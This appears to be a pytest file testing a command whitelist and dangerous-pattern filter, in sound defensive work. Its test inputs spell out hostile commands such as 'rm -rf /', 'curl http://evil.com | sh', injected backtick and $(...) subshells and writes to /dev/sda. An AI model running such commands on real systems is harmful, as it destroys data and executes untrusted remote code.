"""
Tests for validators.safe_executor - Command whitelist, dangerous patterns, security rules.
"""

import pytest
from unittest.mock import patch, MagicMock
from validators.safe_executor import (
    SafeCommandExecutor,
    SecurityError,
    ExecutionError,
    ExecutionResult,
)


pytestmark = pytest.mark.unit


@pytest.fixture
def executor():
    return SafeCommandExecutor(timeout=5)


class TestSecurityWhitelist:
    """Test command whitelist enforcement."""

    def test_whitelisted_command_passes(self, executor):
        assert executor.can_execute(["id"]) is True

    def test_non_whitelisted_command_rejected(self, executor):
        assert executor.can_execute(["rm", "-rf", "/"]) is False

    def test_whitelisted_with_path(self, executor):
        assert executor.can_execute(["/usr/bin/id"]) is True

    def test_getent_whitelisted(self, executor):
        assert executor.can_execute(["getent", "passwd", "root"]) is True

    def test_mount_whitelisted(self, executor):
        assert executor.can_execute(["mount"]) is True


class TestDangerousPatterns:
    """Test dangerous pattern detection."""

    def test_semicolon_rm_blocked(self, executor):
        assert executor.can_execute(["ls", ";", "rm", "-rf", "/"]) is False

    def test_pipe_sh_blocked(self, executor):
        assert executor.can_execute(["curl", "http://evil.com", "|", "sh"]) is False

    def test_backtick_blocked(self, executor):
        assert executor.can_execute(["echo", "`rm -rf /`"]) is False

    def test_subshell_blocked(self, executor):
        assert executor.can_execute(["echo", "$(rm -rf /)"]) is False

    def test_redirect_to_dev_blocked(self, executor):
        assert executor.can_execute(["echo", "test", ">", "/dev/sda"]) is False

    def test_mkfs_blocked(self, executor):
        assert executor.can_execute(["cat", "mkfs.ext4"]) is False


class TestSpecificCommandRules:
    """Test command-specific security rules."""

    def test_systemctl_status_allowed(self, executor):
        assert executor.can_execute(["systemctl", "status", "sshd"]) is True

    def test_systemctl_is_active_allowed(self, executor):
        assert executor.can_execute(["systemctl", "is-active", "sshd"]) is True

    def test_systemctl_start_blocked(self, executor):
        assert executor.can_execute(["systemctl", "start", "sshd"]) is False

    def test_systemctl_stop_blocked(self, executor):
        assert executor.can_execute(["systemctl", "stop", "sshd"]) is False

    def test_firewall_cmd_list_allowed(self, executor):
        assert executor.can_execute(["firewall-cmd", "--list-all"]) is True

    def test_firewall_cmd_add_blocked(self, executor):
        assert executor.can_execute(["firewall-cmd", "--add-port=80/tcp"]) is False

    def test_dnf_list_allowed(self, executor):
        assert executor.can_execute(["dnf", "list"]) is True

    def test_dnf_install_blocked(self, executor):
        assert executor.can_execute(["dnf", "install", "httpd"]) is False

    def test_fdisk_list_allowed(self, executor):
        assert executor.can_execute(["fdisk", "-l"]) is True

    def test_fdisk_without_l_blocked(self, executor):
        assert executor.can_execute(["fdisk", "/dev/sda"]) is False

    def test_bash_syntax_check_allowed(self, executor):
        assert executor.can_execute(["bash", "-n", "script.sh"]) is True

    def test_bash_execute_blocked(self, executor):
        assert executor.can_execute(["bash", "script.sh"]) is False


class TestCommandExecution:
    """Test actual command execution with mocked subprocess."""

    @patch("validators.safe_executor.subprocess.run")
    def test_successful_command(self, mock_run, executor):
        mock_run.return_value = MagicMock(
            returncode=0, stdout="uid=0(root)", stderr=""
        )
        result = executor.execute(["id"])
        assert isinstance(result, ExecutionResult)
        assert result.success is True
        assert result.returncode == 0
        assert "root" in result.stdout

    @patch("validators.safe_executor.subprocess.run")
    def test_failed_command(self, mock_run, executor):
        mock_run.return_value = MagicMock(
            returncode=1, stdout="", stderr="error"
        )
        result = executor.execute(["id", "nonexistent"])
        assert result.success is False
        assert result.returncode == 1

    @patch("validators.safe_executor.subprocess.run")
    def test_timeout_raises_execution_error(self, mock_run, executor):
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="id", timeout=5)
        with pytest.raises(ExecutionError, match="timed out"):
            executor.execute(["id"])

    @patch("validators.safe_executor.subprocess.run")
    def test_command_not_found(self, mock_run, executor):
        mock_run.side_effect = FileNotFoundError()
        result = executor.execute(["id"])
        assert result.success is False
        assert result.returncode == 127

    def test_security_error_on_bad_command(self, executor):
        with pytest.raises(SecurityError):
            executor.execute(["rm", "-rf", "/"])

    @patch("validators.safe_executor.subprocess.run")
    def test_execute_safe_no_exceptions(self, mock_run, executor):
        import subprocess
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="id", timeout=5)
        result = executor.execute_safe(["id"])
        assert result.success is False

    def test_execute_safe_security_blocked(self, executor):
        result = executor.execute_safe(["rm", "-rf", "/"])
        assert result.success is False
